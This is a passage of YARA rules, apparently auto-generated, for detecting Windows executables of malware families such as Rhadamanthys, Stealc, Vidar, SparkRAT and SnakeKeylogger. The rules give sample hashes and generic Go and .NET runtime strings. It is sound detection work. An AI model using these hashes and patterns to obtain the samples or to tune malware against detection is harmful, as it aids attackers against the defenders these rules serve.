      $s6 = "kroot jobsmakechan: bad alignmentnanotime returning zerono space left on deviceoperation not permittedoperation not supportedpan" ascii /* score: '15.00'*/
      $s7 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '14.00'*/
      $s8 = "ault address CertFreeCertificateContextGODEBUG: can not disable \"GetFileInformationByHandlePostQueuedCompletionStatusQueryPerfo" ascii /* score: '11.00'*/
      $s9 = "sched={pc: but progSize  nmidlelocked= out of range  procedure in  untyped args -thread limit" fullword ascii /* score: '11.00'*/
      $s10 = "t.bpbad use of bucket.mpchan send (nil chan)close of nil channelconnection timed outdodeltimer0: wrong Pfloating point errorforc" ascii /* score: '10.00'*/
      $s11 = " failedruntime: s.allocCount= s.allocCount > s.nelemsschedule: holding locksshrinkstack at bad timespan has no free stacksstack " ascii /* score: '10.00'*/
      $s12 = "=runtime: checkdead: find g runtime: checkdead: nmidle=runtime: netpollinit failedruntime: thread ID overflowruntime" fullword ascii /* score: '10.00'*/
      $s13 = "CertEnumCertificatesInStoreG waiting list is corruptedaddress not a stack addresschannel number out of rangecommunication error " ascii /* score: '9.00'*/
      $s14 = "structure needs cleaning bytes failed with errno= to unused region of span with too many arguments GODEBUG: can not enable \"Get" ascii /* score: '8.00'*/
      $s15 = "CreateDirectoryWDnsNameCompare_WFlushFileBuffersGC scavenge waitGC worker (idle)GODEBUG: value \"GetComputerNameWGetFullPathName" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__132 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash4 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash5 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash6 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash7 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash8 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash9 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash10 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
      hash11 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash12 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash13 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash14 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash15 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash16 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash17 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash18 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.dumpgstatus" fullword ascii /* score: '20.00'*/
      $s2 = "runtime.dumpregs" fullword ascii /* score: '20.00'*/
      $s3 = "runtime.printcomplex" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.printslice" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.throw.func1" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.checkmcount" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.panicfloat" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.printfloat" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.fmtNSAsMS" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.fatalthrow.func1" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.panicoverflow" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.exitThread" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.throw" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.fatalthrow" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.panicmem" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__7bfcbc53d4c02bdedbc3a63219e5ed9f_imphash__Rhadamanthys_signature__d5834be2544a02797750dc7759c325d4__133 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash2 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash3 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash4 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash5 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $s1 = "NFindInterfaceMethodImplementationTarget" fullword ascii /* score: '14.00'*/
      $s2 = "LGetCultureNotSupportedExceptionMessage GetCultureByName" fullword ascii /* score: '12.00'*/
      $s3 = "(GetSystemArrayEEType" fullword ascii /* score: '12.00'*/
      $s4 = "*GetUserDefaultCulture0GetUserDefaultLocaleName@" fullword ascii /* score: '11.00'*/
      $s5 = "\"GetArgumentString" fullword ascii /* score: '9.00'*/
      $s6 = "\"GetNewThunksBlock" fullword ascii /* score: '9.00'*/
      $s7 = "get_CultureName6get_TwoLetterISOCountryName(get_NumberGroupSizes@" fullword ascii /* score: '9.00'*/
      $s8 = ",IcuGetTimeFormatString@" fullword ascii /* score: '9.00'*/
      $s9 = "&GetCodePageDataItem" fullword ascii /* score: '9.00'*/
      $s10 = " IcuGetLocaleInfo@" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( all of them )
      ) or ( all of them )
}

